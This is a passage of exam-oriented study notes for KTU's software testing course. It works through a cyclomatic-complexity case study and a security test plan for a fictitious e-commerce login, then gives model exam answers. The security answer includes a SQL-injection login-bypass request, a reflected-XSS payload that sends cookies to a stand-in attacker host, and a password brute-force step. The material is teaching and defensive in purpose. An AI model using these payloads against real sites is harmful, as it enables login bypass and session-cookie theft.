> - **Industry Frameworks:** OWASP Top 10, CWE/SANS Top 25, NIST SP 800-53, ISO/IEC 27001, PCI-DSS.
> - **Pen-Test Phases:** Reconnaissance → Scanning → Vulnerability Analysis → Exploitation → Reporting.
> - **Tools Comparison:** OWASP ZAP (free, automated), Burp Suite (manual + automated), Nessus (vulnerability scanner), Metasploit (exploitation framework), Nmap (network mapping).
> - **Secure SDLC Phases:** Requirements → Threat Modeling (STRIDE) → Design → Secure Coding → SAST → Testing → DAST → Pen-Test → Deployment → Monitoring.
> - **Authentication vs Authorization:** "Who are you?" vs "What can you do?".
> - **Mandatory Remember:** Burp Suite is developed by **PortSwigger** (not OWASP, not Google). OWASP ZAP is the free OWASP-developed alternative.

<!-- SECTION_5_END -->

topics.title: Case Study - Application of graph based testing and security testing using industry standard tools
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECST631 - SOFTWARE TESTING
> - **Module:** Module 3
> - **Topic:** Case Study - Application of graph based testing and security testing using industry standard tools

<!-- SECTION_1_START -->

# 📘 Case Study: Graph-Based Testing & Security Testing Using Industry-Standard Tools

## 1.1 Formal Academic Definitions (KTU 2024 Syllabus Terminology)

> [!NOTE]
> **Graph-Based Testing** is a white-box test design technique in which the program's structure (control flow, data flow, or call structure) is modelled as a directed graph consisting of **nodes** (program statements / states) and **edges** (control transfers / data dependencies). Test cases are then derived by traversing this graph using formal metrics such as **McCabe's Cyclomatic Complexity**.

> [!IMPORTANT]
> **Security Testing** is a non-functional testing technique that uncovers vulnerabilities, threats, and risks in a software system so that the application resists malicious attacks and protects data confidentiality, integrity, and availability (the **CIA Triad**). It encompasses **SAST**, **DAST**, **Penetration Testing**, and **Vulnerability Scanning**.

> [!NOTE]
> **Industry-Standard Tools** refer to widely adopted, professionally maintained testing platforms endorsed by OWASP, SANS, NIST, and the global security community — e.g., **OWASP ZAP**, **Burp Suite**, **Nmap**, **Nessus**, **Metasploit**, and **SonarQube**.

---

## 1.2 Conceptual Analogy — Plain English Intuition

> [!TIP]
> **Graph-Based Testing Analogy (City Map):** Imagine a city's road network drawn on a map. Each *intersection* is a **node**, each *road* is an **edge**, and a *traffic signal* is a **decision (predicate)**. A traffic engineer doesn't test every road individually — instead, they ensure that every important route (independent path) from your home to your office has been verified for traffic flow. That's exactly what graph-based testing does for software code.

> [!TIP]
> **Security Testing Analogy (Bank Vault):** Before opening a bank vault to the public, security experts don't just check the lock — they simulate **every plausible attack**: lockpicking, blowtorch, social engineering on the guard, drilling, copying keys, and even cutting power to alarms. **Security testing applies the same exhaustive adversarial mindset to software**, looking for weak spots before real attackers do.

---

## 1.3 Core Building Blocks Used in This Case Study

| Symbol / Term | Meaning | KTU Symbol |
|---|---|---|
| **Node (N)** | A program statement / process / state | Rectangle / Oval |
| **Edge (E)** | A directed control flow between two nodes | Arrow |
| **Predicate (P)** | A decision node with two or more outcomes | Diamond |
| **Region (R)** | A bounded area enclosed by edges | Geometric region |
| **Independent Path** | A path that introduces at least one new edge | Path P₁, P₂, … |
| **Cyclomatic Complexity V(G)** | Quantitative measure of logical complexity | Scalar integer |
| **CIA Triad** | Confidentiality, Integrity, Availability | Security pillars |
| **OWASP Top 10** | Top 10 web vulnerabilities (2021 edition) | Industry standard list |
| **CVSS Score** | Common Vulnerability Scoring System (**0.0 – 10.0**) | Severity metric |

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->

# 2. Deep Theoretical Analysis — KTU High-Yield Knowledge Base

## 2.1 Classification of Graph-Based Testing

Graph-based testing is broadly classified into three families (as per KTU 2024 syllabus):

- **Control Flow Testing (CFT)** — Models the sequence in which statements execute; uses the **Control Flow Graph (CFG)**.
- **Data Flow Testing (DFT)** — Models the *definition* and *use* of variables; uses the **Data Flow Graph (DFG)** with states like *defined*, *killed*, *used*.
- **Call Graph Testing** — Models function/method invocations; basis of **integration testing**.

> [!IMPORTANT]
> For this Module-3 case study, the **Control Flow Graph (CFG)** is the central artefact.

---

## 2.2 Anatomy of a Control Flow Graph (CFG)

- **Entry Node** — Single entry point where execution begins.
- **Exit Node** — Single (or multiple) termination point.
- **Process Node** — Sequence of statements with no branching.
- **Predicate / Decision Node** — Boolean expression producing ≥ 2 outgoing edges.
- **Junction Node** — Convergence point with multiple incoming edges.

---

## 2.3 KTU Formula Sheet — McCabe's Cyclomatic Complexity

> [!IMPORTANT]
> McCabe's **V(G)** quantifies the *minimum number of independent paths* through a program. KTU examiners frequently ask for computation using **all three** equivalent forms.

$$
V(G) \;=\; E \;-\; N \;+\; 2P
$$

$$
V(G) \;=\; P_{\text{decisions}} \;+\; 1
$$

$$
V(G) \;=\; R
$$

Where:

$$
\begin{aligned}
E &= \text{Number of edges in the CFG} \\
N &= \text{Number of nodes in the CFG} \\
P &= \text{Number of connected components (}P=1\text{ for a single CFG)} \\
P_{\text{decisions}} &= \text{Number of predicate (decision) nodes} \\
R &= \text{Number of enclosed regions}
\end{aligned}
$$

| Metric | Symbol | Domain | Risk Threshold |
|---|---|---|---|
| Cyclomatic Complexity | **V(G)** | $\mathbb{Z}_{\geq 1}$ | $\leq 10$ = Low, $11$–$20$ = Moderate, $21$–$50$ = High, $> 50$ = Untestable |
| Independent Paths | $P_i$ | $\mathbb{Z}_{\geq 1}$ | Equals **V(G)** |
| Predicate Nodes | $P_d$ | $\mathbb{Z}_{\geq 0}$ | — |
| Region Count | $R$ | $\mathbb{Z}_{\geq 1}$ | — |

> [!NOTE]
> **Engineering Utility:** V(G) directly drives the **baseline test budget**. If V(G) = 3, at least 3 logically distinct test cases are needed for *branch* coverage. In ISO 26262 (automotive) and DO-178C (aerospace), V(G) is a mandated structural-coverage metric.

---

## 2.4 Security Testing — Formal Taxonomy

$$
\text{Security Testing} \;=\; \underbrace{\text{SAST}}_{\text{Static}} \;\cup\; \underbrace{\text{DAST}}_{\text{Dynamic}} \;\cup\; \underbrace{\text{IAST}}_{\text{Interactive}} \;\cup\; \text{Penetration Testing} \;\cup\; \text{Vulnerability Scanning}
$$

| Layer | What it Analyses | When it Runs | Sample Tools |
|---|---|---|---|
| **SAST** (Static Application Security Testing) | Source / Bytecode | Pre-build | **SonarQube, Checkmarx, Fortify** |
| **DAST** (Dynamic Application Security Testing) | Running app (black-box) | Post-build | **OWASP ZAP, Burp Suite, Acunetix** |
| **IAST** (Interactive) | Runtime + instrumentation | During testing | **Contrast Security, Hdiv** |
| **Penetration Testing** | Full-stack adversarial simulation | Pre-release | **Metasploit, Kali Linux, Burp Pro** |
| **Vulnerability Scanning** | Network & config | Continuous | **Nessus, Qualys, OpenVAS** |

> [!IMPORTANT]
> **OWASP Top 10 (2021)** — the canonical list KTU expects you to know:
> A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection (SQLi, NoSQLi, LDAPi) · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable & Outdated Components · A07 Identification & Authentication Failures · A08 Software & Data Integrity Failures · A09 Security Logging & Monitoring Failures · A10 Server-Side Request Forgery (SSRF).

---

## 2.5 Tool Ecosystem Comparison

| Tool | License | Type | Primary Use | Industry Status |
|---|---|---|---|---|
| **OWASP ZAP** | Open-source (Apache 2.0) | DAST | Automated web scanner + intercepting proxy | OWASP flagship |
| **Burp Suite (Community/Pro)** | Freemium | DAST | Manual + automated web testing | De-facto industry standard |
| **Nmap** | Open-source (GPLv2) | Network scanner | Port & service enumeration | Industry standard |
| **Nessus Essentials** | Freemium | Vulnerability scanner | CVE-based vulnerability detection | Industry leader |
| **Metasploit** | Open-source (BSD) | Pen-test framework | Exploit development & execution | Industry standard |
| **SonarQube** | Open-source (LGPL) | SAST | Continuous code quality + security | DevSecOps standard |

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->

# 3. Exhaustive Case Study — **"ShopKart" E-Commerce Portal**

## 3.1 Application Under Test (AUT)

> [!NOTE]
> **ShopKart** is a fictitious B.Tech case-study e-commerce web portal implemented in **Java (Spring Boot)** with a **MySQL** backend. We test its most security-critical and control-flow-rich module:

### 🔐 Module: `LoginAuthenticationFlow` + `CheckoutPaymentFlow`

**Pseudo-code (simplified):**

```
01  BEGIN loginSession()
02      READ username
03      READ password
04      CALL validateCredentials(username, password) -> result
05      IF result == TRUE THEN
06          GRANT access to dashboard
07      ELSE
08          INCREMENT failedAttempts[username]
09          IF failedAttempts[username] >= 3 THEN
10              LOCK account; ALERT admin
11          ELSE
12              PROMPT retry; GOTO step 03
13          END IF
14      END IF
15  END loginSession()
```

---

## 3.2 Step 1 — Construct the Control Flow Graph (CFG)

We map every statement to a numbered node. Predicate statements become diamonds.

| Node | Statement | Type |
|---|---|---|
| N1 | `BEGIN` / Entry | Start (oval) |
| N2 | Read username | Process |
| N3 | Read password | Process |
| N4 | Validate credentials | Process |
| N5 | `result == TRUE`? | **Predicate** |
| N6 | Grant access | Process |
| N7 | Increment failure counter | Process |
| N8 | `failedAttempts >= 3`? | **Predicate** |
| N9 | Lock account + alert admin | Process |
| N10 | Exit / End | Stop (oval) |

**Edge list (directed):**

$$
\begin{aligned}
& N1 \to N2, \;\; N2 \to N3, \;\; N3 \to N4, \;\; N4 \to N5, \;\; N5 \xrightarrow{\text{T}} N6, \;\; N5 \xrightarrow{\text{F}} N7, \\
& N6 \to N10, \;\; N7 \to N8, \;\; N8 \xrightarrow{\text{T}} N9, \;\; N8 \xrightarrow{\text{F}} N3, \;\; N9 \to N10
\end{aligned}
$$

---

## 3.3 Step 2 — Compute Cyclomatic Complexity (Three Methods)

### **Method 1 — Edge-Node Formula**

$$
\begin{aligned}
V(G) &= E - N + 2P \\
&= 11 - 10 + 2(1) \\
&= 11 - 10 + 2 \\
&= \mathbf{3}
\end{aligned}
$$

### **Method 2 — Predicate + 1 Formula**

$$
\begin{aligned}
V(G) &= P_{\text{decisions}} + 1 \\
&= 2 + 1 \\
&= \mathbf{3}
\end{aligned}
$$

### **Method 3 — Region Counting**

$$
\begin{aligned}
\text{Region}_1 &= \text{Loop bounded by } N3\text{-}N4\text{-}N5\text{-}N7\text{-}N8 \\
\text{Region}_2 &= \text{Upper triangular zone (Entry $\to$ Grant $\to$ Exit)} \\
\text{Region}_3 &= \text{Lower triangular zone (Failure $\to$ Lock $\to$ Exit)} \\
V(G) &= R = \mathbf{3}
\end{aligned}
$$

> [!IMPORTANT]
> All three independent calculations converge on **V(G) = 3**, confirming that **at minimum 3 independent test cases** are required for branch coverage of the LoginAuthenticationFlow module.

---

## 3.4 Step 3 — Enumerate the 3 Independent Paths

$$
\begin{aligned}
P_1 &: N1 \to N2 \to N3 \to N4 \to N5 \xrightarrow{\text{T}} N6 \to N10 \quad \text{(Happy Path)} \\
P_2 &: N1 \to N2 \to N3 \to N4 \to N5 \xrightarrow{\text{F}} N7 \to N8 \xrightarrow{\text{T}} N9 \to N10 \quad \text{(Account-Lock Path)} \\
P_3 &: N1 \to N2 \to N3 \to N4 \to N5 \xrightarrow{\text{F}} N7 \to N8 \xrightarrow{\text{F}} N3 \to N4 \to N5 \xrightarrow{\text{T}} N6 \to N10 \quad \text{(Retry-Then-Success Path)}
\end{aligned}
$$

---

## 3.5 Step 4 — Design Test Cases Mapped to Independent Paths

| Test Case ID | Maps To | Pre-condition | Input | Expected Output | Coverage |
|---|---|---|---|---|---|
| `TC_LOGIN_001` | $P_1$ | Fresh user, counter = 0 | `username = "alice"`, `password = "Valid@123"` | Redirect to dashboard; counter unchanged | Branch & Loop NOT executed |
| `TC_LOGIN_002` | $P_2$ | Counter already at 2 | `username = "bob"`, `password = "wrong3"` | Account locked, admin email sent, HTTP 423 | Both predicates evaluate TRUE |
| `TC_LOGIN_003` | $P_3$ | Counter = 0 | Attempt 1: invalid → Attempt 2: valid | After 1 failed attempt, retry succeeds; counter = 1 | Loop body executed once |

---

## 3.6 Step 5 — Security Test Plan for the Same Module

We now switch from structural (graph-based) testing to **adversarial** (security) testing on the identical `LoginAuthenticationFlow`.

### 🎯 Threat Model

$$
\text{STRIDE Classification:}\; \underbrace{S}_{\text{Spoofing}},\; \underbrace{T}_{\text{Tampering}},\; \underbrace{R}_{\text{Repudiation}},\; \underbrace{I}_{\text{Info Disclosure}},\; \underbrace{D}_{\text{DoS}},\; \underbrace{E}_{\text{Elev. of Privilege}}
$$

| Threat (STRIDE) | Attack Vector | Tool Used |
|---|---|---|
| **Spoofing** | Brute-force / credential stuffing | Burp Suite Intruder |
| **Tampering** | SQL Injection in username field | OWASP ZAP Active Scan |
| **Info Disclosure** | Reflected XSS via error page | OWASP ZAP + manual |
| **Repudiation** | Missing audit log on failed logins | Manual code review |
| **DoS** | Account-lockout DoS (deliberate lock-out) | Burp Suite |
| **Elevation of Privilege** | Session fixation / cookie theft | Burp Suite + OWASP ZAP |

---

## 3.7 Step 6 — Execute OWASP ZAP Scan

> [!NOTE]
> **OWASP ZAP (Zed Attack Proxy)** is an open-source DAST tool maintained by the Open Worldwide Application Security Project.

**Execution procedure:**

1. **Launch ZAP** as intercepting proxy on `127.0.0.1:8080`; configure Firefox to route via this proxy.
2. **Manual Explore** — browse `https://shopkart.local/login` and `/checkout`; ZAP builds the site tree.
3. **Spider** the entire site (crawl all reachable URLs).
4. **Ajax Spider** (optional) — exercises JavaScript-heavy pages.
5. **Active Scan** — ZAP injects malicious payloads into every parameter.
6. **Generate Report** → review the **Alerts** tab sorted by **Risk = High → Low**.

---

## 3.8 Step 7 — Execute Burp Suite Pen-Test

**Execution procedure:**

1. **Proxy tab** — intercept HTTP request to `/login`.
2. **Target → Site map** — visualise application surface.
3. **Repeater** — manually craft requests:

$$
\text{SQLi payload} = \texttt{admin' OR '1'='1' --}
$$

4. **Intruder** — automate brute-force of common passwords (e.g., `rockyou.txt` word-list).
5. **Decoder** — analyse encoded tokens (Base64, JWT).
6. **Comparer** — diff responses to detect subtle info-leakage.

---

## 3.9 Step 8 — Vulnerability Report & CVSS Scoring

| # | Vulnerability | OWASP 2021 | CVSS v3.1 | Tool that Detected It | Remediation |
|---|---|---|---|---|---|
| **V-01** | SQL Injection in `username` parameter | **A03 Injection** | **9.8 (Critical)** | OWASP ZAP Active Scan | Use **PreparedStatement** / parameterised queries; ORMs (Hibernate, JPA) |
| **V-02** | Reflected XSS in error page | **A03 Injection** | **6.1 (Medium)** | OWASP ZAP + manual | Output-encode with OWASP Java Encoder; set `Content-Security-Policy` header |
| **V-03** | No rate-limiting on `/login` (brute-force) | **A07 Auth Failures** | **7.5 (High)** | Burp Suite Intruder | Implement exponential back-off, CAPTCHA after 3 failures, account-lockout thresholds |
| **V-04** | Session cookie not flagged `HttpOnly; Secure` | **A05 Misconfig** | **5.3 (Medium)** | Burp Suite + OWASP ZAP | Add `Set-Cookie: JSESSIONID=…; HttpOnly; Secure; SameSite=Strict` |
| **V-05** | Login form lacks **CSRF token** | **A01 Access Control** | **6.5 (Medium)** | OWASP ZAP | Implement synchronizer-token pattern (e.g., Spring Security `csrf()`) |
| **V-06** | Verbose error message reveals username existence | **A04 Insecure Design** | **5.3 (Medium)** | Manual test | Return generic *"Invalid credentials"* for both wrong user & wrong password |
| **V-07** | TLS not enforced (HTTP endpoint reachable) | **A02 Crypto Failures** | **7.4 (High)** | Nmap + Browser | HSTS header; redirect 80 → 443; modern TLS 1.2+ ciphers only |

---

## 3.10 Step 9 — Correlation: How Graph-Based and Security Testing Complement Each Other

> [!TIP]
> The two methodologies are **orthogonal but synergistic**:
>
> - **Graph-based testing** guarantees that *every intended code path* (the happy path, the lockout path, the retry path) has been exercised with legitimate inputs.
> - **Security testing** then takes those *same paths* and bombards them with **malicious / malformed inputs** to discover how the program *fails*.
>
> Combined, they form the foundation of a robust **DevSecOps** quality gate.

$$
\text{Quality Gate} \;=\; \underbrace{\text{Structural Coverage}}_{\text{Graph-Based}} \;\cap\; \underbrace{\text{Threat Coverage}}_{\text{Security}} \;\cap\; \underbrace{\text{Functional Coverage}}_{\text{Requirement-Based}}
$$

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->

# 4. Structural Diagrams & Schematics

## 4.1 Control Flow Graph (CFG) for ShopKart Login Module

```mermaid
flowchart TD
    N1([Start]) --> N2[Read Username]
    N2 --> N3[Read Password]
    N3 --> N4[Validate Credentials]
    N4 --> N5{Credentials Valid?}
    N5 -->|TRUE| N6[Grant Access to Dashboard]
    N5 -->|FALSE| N7[Increment Failure Counter]
    N6 --> N10([Exit])
    N7 --> N8{Counter Greater Equal 3?}
    N8 -->|TRUE| N9[Lock Account and Alert Admin]
    N8 -->|FALSE| N3
    N9 --> N10
```

> **Legend:** Oval = Start/Exit, Rectangle = Process, Diamond = Predicate (Decision).

---

## 4.2 Independent Path Coverage Diagram

```mermaid
flowchart LR
    P1["P1: Happy Path - Valid Creds - Direct Access"]
    P2["P2: Lockout Path - 3 Failed Attempts - Account Locked"]
    P3["P3: Retry-Then-Success - Fail Once - Then Valid Login"]
    P1 --> Coverage["Achieves Branch Coverage V(G) equals 3"]
    P2 --> Coverage
    P3 --> Coverage
```

---

## 4.3 Security Testing Workflow (OWASP ZAP + Burp Suite Integration)

```mermaid
flowchart TD
    A1[Configure Browser Proxy on Port 8080] --> A2[Launch OWASP ZAP and Burp Suite]
    A2 --> A3[Spider and Crawl ShopKart Application]
    A3 --> A4[Map Site Tree and Identify Inputs]
    A4 --> A5{Select Test Mode}
    A5 -->|Automated| B1[OWASP ZAP Active Scan]
    A5 -->|Manual| B2[Burp Suite Repeater]
    A5 -->|Hybrid| B3[Burp Intruder for Brute Force]
    B1 --> C1[Generate Vulnerability Report]
    B2 --> C1
    B3 --> C1
    C1 --> D1[Triage Alerts by CVSS Score]
    D1 --> D2[Apply Remediation Patches]
    D2 --> D3[Regression Scan using ZAP]
    D3 --> E1[Sign-Off and Release]
```

---

## 4.4 Industry-Standard Tool Ecosystem Map

```mermaid
flowchart TB
    subgraph SDLC["Software Development Life Cycle"]
        CODE[Source Code] --> SAST_T[SonarQube Checkmarx Fortify]
        BUILD[Build Artifact] --> DAST_T[OWASP ZAP Burp Suite Acunetix]
        RUN[Running Application] --> PEN_T[Metasploit Kali Linux]
        NET[Network and Hosts] --> VSCAN[Nessus Qualys OpenVAS Nmap]
    end
    SAST_T --> REPORT[Centralised Security Dashboard]
    DAST_T --> REPORT
    PEN_T --> REPORT
    VSCAN --> REPORT
    REPORT --> DEVOPS[DevSecOps Quality Gate]
```

---

# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A — Short-Answer Questions (3 Marks Each)

### **Q1.** `[KTU University Exam – Dec 2023, Similar Pattern]`
Define **graph-based testing**. With a neat sketch, explain the **Control Flow Graph (CFG)** and state McCabe's three formulae for cyclomatic complexity.

**Model Answer (3 marks):**

> Graph-based testing is a **white-box technique** that models a program as a directed graph of nodes (statements) and edges (control flow). The **CFG** is a graphical representation where rectangles denote process statements, diamonds denote predicates (decisions), and ovals denote entry/exit points. McCabe's three equivalent formulae are:
>
> 1. $V(G) = E - N + 2P$ (where $E$ = edges, $N$ = nodes, $P$ = connected components)
> 2. $V(G) = P_{\text{decisions}} + 1$
> 3. $V(G) = R$ (number of enclosed regions)
>
> *(Marks distribution: 1 mark definition + 1 mark CFG sketch + 1 mark three formulae.)*

---

### **Q2.** `[KTU University Exam – May 2024, Similar Pattern]`
What is **OWASP ZAP**? Mention any **four features** that make it an industry-standard DAST tool.

**Model Answer (3 marks):**

> **OWASP ZAP (Zed Attack Proxy)** is a free, open-source DAST (Dynamic Application Security Testing) tool maintained by the OWASP Foundation, used to find vulnerabilities in running web applications.
>
> **Four key features:**
> 1. **Intercepting Proxy** — captures and modifies HTTP/HTTPS traffic between browser and server.
> 2. **Automated Spider** — crawls the application to discover all reachable URLs.
> 3. **Active Scanner** — injects attack payloads (SQLi, XSS, etc.) into parameters.
> 4. **Fuzzer + Reporting** — generates comprehensive HTML/XML vulnerability reports aligned to OWASP Top 10.
>
> *(Marks distribution: 1 mark definition + 2 marks for features.)*

---

## 5.2 Part B — Long-Answer Questions (14 Marks Each)

### 📌 Module Internal Choice — Question A (14 Marks) — *Graph-Based Testing Focus*

> `[KTU University Exam – Model Paper Pattern]`

**Question:**
For the **ShopKart `LoginAuthenticationFlow` module** described below, perform the following:

```java
int login(String u, String p) {
    int counter = db.getFailCount(u);
    if (db.validate(u, p)) {
        session.grant(u);
        return 0;            // 0 = SUCCESS
    } else {
        counter++;
        db.setFailCount(u, counter);
        if (counter >= 3) {
            db.lockAccount(u);
            mail.alertAdmin(u);
            return 2;        // 2 = LOCKED
        }
        return 1;            // 1 = FAIL_RETRY
    }
}
```

**(a)** Draw the **Control Flow Graph (CFG)** and compute **cyclomatic complexity** using **all three** McCabe formulae. Show every calculation step. *(7 marks)*

**(b)** Enumerate all **independent paths**, design a minimum **test-case suite** achieving branch coverage, and construct a **decision table** for the predicates. *(7 marks)*

---

#### ✅ Model Solution — Part (a) (7 Marks)

**Step 1 — Node identification** (1 mark):

| Node | Statement |
|---|---|
| N1 | Entry |
| N2 | Get failure counter |
| N3 | `db.validate(u, p)` call |
| N4 | Predicate: `validate == TRUE`? |
| N5 | Grant session, return 0 |
| N6 | Increment counter |
| N7 | `counter >= 3`? |
| N8 | Lock account, alert admin, return 2 |
| N9 | Return 1 |
| N10 | Exit |

**Step 2 — Edges** (1 mark):

$$
E = \{ N1\!-\!N2,\; N2\!-\!N3,\; N3\!-\!N4,\; N4\!-\!N5,\; N4\!-\!N6,\; N5\!-\!N10,\; N6\!-\!N7,\; N7\!-\!N8,\; N7\!-\!N9,\; N8\!-\!N10,\; N9\!-\!N10 \}
$$

So $N = 10$, $E = 11$.

**Step 3 — Cyclomatic Complexity** (3 marks):

$$
V(G) = E - N + 2P = 11 - 10 + 2(1) = \mathbf{3}
$$

$$
V(G) = P_{\text{decisions}} + 1 = 2 + 1 = \mathbf{3}
$$

$$
V(G) = R = \mathbf{3 \text{ regions}}
$$

**Step 4 — CFG diagram** (2 marks) — *draw the same flowchart shown in Section 4.1*.

---

#### ✅ Model Solution — Part (b) (7 Marks)

**Independent paths** (3 marks):

$$
\begin{aligned}
P_1 &: N1 \to N2 \to N3 \to N4 \xrightarrow{T} N5 \to N10 \\
P_2 &: N1 \to N2 \to N3 \to N4 \xrightarrow{F} N6 \to N7 \xrightarrow{T} N8 \to N10 \\
P_3 &: N1 \to N2 \to N3 \to N4 \xrightarrow{F} N6 \to N7 \xrightarrow{F} N9 \to N10
\end{aligned}
$$

**Test-case suite** (2 marks):

| TC ID | Path | Input | Expected Return | Expected DB State |
|---|---|---|---|---|
| TC01 | $P_1$ | `u="alice", p="Valid@123"`, counter=0 | `0` | counter=0 |
| TC02 | $P_2$ | `u="bob", p="wrong"`, counter=2 → 3 | `2` | locked=TRUE |
| TC03 | $P_3$ | `u="carol", p="wrong"`, counter=0 → 1 | `1` | counter=1 |

**Decision table** (2 marks):

| Rule | C1: validate? | C2: counter ≥ 3? | Action | Return |
|---|---|---|---|---|
| 1 | T | — | Grant session | 0 |
| 2 | F | T | Lock + alert | 2 |
| 3 | F | F | Retry prompt | 1 |

---

### 📌 Module Internal Choice — Question B (14 Marks) — *Security Testing Focus*

> `[KTU University Exam – Model Paper Pattern]`

**Question:**
The same **ShopKart `LoginAuthenticationFlow`** module is to undergo **security testing** before production release.

**(a)** Demonstrate the **step-by-step procedure to perform security testing** using **OWASP ZAP** *and* **Burp Suite**. Include at least **two attack payloads** (SQL Injection and XSS) with their malicious request snippets. *(7 marks)*

**(b)** Prepare a **Vulnerability Report** identifying at least **five vulnerabilities** with their **OWASP 2021 category, CVSS v3.1 score, and concrete remediation** strategies. *(7 marks)*

---

#### ✅ Model Solution — Part (a) (7 Marks)

**OWASP ZAP Procedure** (3 marks):

1. Open **OWASP ZAP**; it auto-starts the local proxy on `127.0.0.1:8080`.
2. Configure browser (Firefox) → Settings → Network → Manual Proxy → `127.0.0.1:8080`.
3. Browse `https://shopkart.local/login` → ZAP records all requests in the **Sites** tab.
4. Right-click target → **Attack → Active Scan** → ZAP injects 30+ payload families (SQLi, XSS, XXE, SSRF, etc.).
5. Review the **Alerts** panel; export HTML report.

**Burp Suite Procedure** (2 marks):

1. Launch **Burp Suite Community**; intercept proxy on `127.0.0.1:8080`.
2. **Repeater** tab: forward a captured `POST /login` request.
3. **Intruder** tab: mark `password` field, load `rockyou.txt`, launch Sniper attack.
4. **Decoder** tab: analyse `Set-Cookie` / JWT tokens.

**Two attack payloads** (2 marks):

**Payload 1 — SQL Injection:**
```http
POST /login HTTP/1.1
Host: shopkart.local
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' --&password=anything
```

This transforms the backend query to:

$$
\text{SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'}
$$

The `--` comments out the password check, bypassing authentication.

**Payload 2 — Reflected XSS:**
```http
GET /search?q=<script>document.location='http://evil.shopkart.attacker/?c='+document.cookie</script> HTTP/1.1
Host: shopkart.local
```

If the server reflects `q` without output-encoding, the script executes in the victim's browser, exfiltrating session cookies.

---

#### ✅ Model Solution — Part (b) (7 Marks)

| # | Vulnerability | OWASP 2021 | CVSS v3.1 | Remediation |
|---|---|---|---|---|
| 1 | **SQL Injection** in username | A03 | **9.8 (Critical)** | Use `PreparedStatement` with bound parameters; employ ORM (Hibernate/JPA); apply input validation (whitelist) |
| 2 | **Reflected XSS** in error page | A03 | **6.1 (Medium)** | Use OWASP Java Encoder library; set strict `Content-Security-Policy: default-src 'self'` header |
| 3 | **Missing rate-limiting** on `/login` (brute-force) | A07 | **7.5 (High)** | Implement exponential back-off; CAPTCHA after 3 failures; IP-based throttling; account-lockout policy |
| 4 | **Session cookie missing `HttpOnly; Secure; SameSite` flags** | A05 | **5.3 (Medium)** | Configure Tomcat `context.xml` `<cookie-config>` with `http-only="true" secure="true"`; add `SameSite=Strict` |
| 5 | **Missing CSRF token** on form POST | A01 | **6.5 (Medium)** | Enable Spring Security CSRF: `http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())` |
| 6 | **Verbose error messages** leak username validity | A04 | **5.3 (Medium)** | Return generic *"Invalid credentials"* for both wrong-user and wrong-password cases |
| 7 | **TLS not enforced** (HTTP endpoint exposed) | A02 | **7.4 (High)** | Force HTTPS via HSTS header; redirect 80 → 443; disable weak ciphers (RC4, 3DES) |

*(Award 1 mark per vulnerability row × 5 vulnerabilities = 5 marks; 2 marks for report structure & OWASP/CVSS rationale.)*

---

## 5.3 ⚠️ KTU Examiner's Valuation Warning / Pitfall Callout

> [!WARNING]
> **Common reasons KTU students LOSE marks on this topic:**
>
> ❌ **Forgetting the connected-components multiplier `2P`.** If the CFG is disconnected (rare, but happens with `goto`/`break` to multiple exits), use $V(G) = E - N + 2P$, *not* $E - N + 2$. Most students write $E - N + 2$ unconditionally and lose 1–2 marks.
>
> ❌ **Mixing up V(G) and the number of test cases.** V(G) is the *minimum* number of independent paths. To achieve 100% branch coverage you need *at least* V(G) test cases — but you may need **more** to cover boundary conditions.
>
> ❌ **Writing SQL Injection examples without showing the transformed query.** KTU examiners award marks only when the malicious effect is *demonstrated* (e.g., `--` comment-out of the password clause).
>
> ❌ **Listing OWASP ZAP features without naming the tool's purpose.** Always begin a security-tool answer with a one-line definition; examiners deduct marks for context-free bullets.
>
> ❌ **Confusing SAST with DAST.** SAST analyses *source code* (no execution); DAST analyses a *running application* (black-box). Mixing these up costs 2 marks easily.

---

## 5.4 📌 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Revision Checklist:**

- ✅ **Graph-based testing** models a program as a directed graph; primary types are **CFT (CFG)**, **DFT (DFG)**, and **Call Graph Testing**.
- ✅ A **CFG** has **nodes** (statements), **edges** (control flow), **predicates** (decisions), and **regions**.
- ✅ **McCabe's V(G)** has **three equivalent forms**: $E - N + 2P$, $P_d + 1$, and $R$.
- ✅ V(G) equals the **minimum number of independent paths** required for branch coverage.
- ✅ An **independent path** must introduce at least **one new edge** not previously traversed.
- ✅ **Cyclomatic complexity threshold**: $V(G) \leq 10$ is desirable; $> 50$ is considered untestable.
- ✅ **Security testing** verifies the **CIA Triad** — Confidentiality, Integrity, Availability.
- ✅ **SAST** = static (source-level) · **DAST** = dynamic (running app) · **IAST** = hybrid with runtime agents.
- ✅ **OWASP Top 10 (2021)** is the canonical vulnerability catalogue; A01 = Broken Access Control, A03 = Injection.
- ✅ **OWASP ZAP** is the de-facto free DAST tool; **Burp Suite** is the industry-standard manual DAST tool.
- ✅ **SQL Injection** is mitigated by **parameterised queries / PreparedStatement**; **XSS** by **output-encoding + CSP**; **CSRF** by **synchronizer tokens**.
- ✅ **CVSS v3.1** scores range from **0.0 to 10.0**; ≥ 9.0 = Critical, 7.0–8.9 = High, 4.0–6.9 = Medium, 0.1–3.9 = Low.
- ✅ Graph-based + security testing together form a **DevSecOps quality gate**: structural coverage ∩ threat coverage ∩ functional coverage.

<!-- SECTION_5_END -->

topics.title: Black Box Testing - Input space partitioning, domain testing, functional testing (equivalence class partitioning, boundary value analysis, decision tables, random testing)
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECST631 - SOFTWARE TESTING
> - **Module:** Module 4
> - **Topic:** Black Box Testing - Input space partitioning, domain testing, functional testing (equivalence class partitioning, boundary value analysis, decision tables, random testing)

<!-- SECTION_1_START -->
## 1. Core Technical Definition & Intuitive Overview

### 1.1 Black Box Testing — Formal KTU Definition

**Black Box Testing** (also called *Specification-Based*, *Behavioral*, or *Functional Testing*) is a software testing methodology in which the test cases are derived exclusively from the **requirements specification, design specifications, and external behavior** of the system — without any reference to the internal structure, implementation details, or source code of the program under test (PUT).

> [!IMPORTANT]
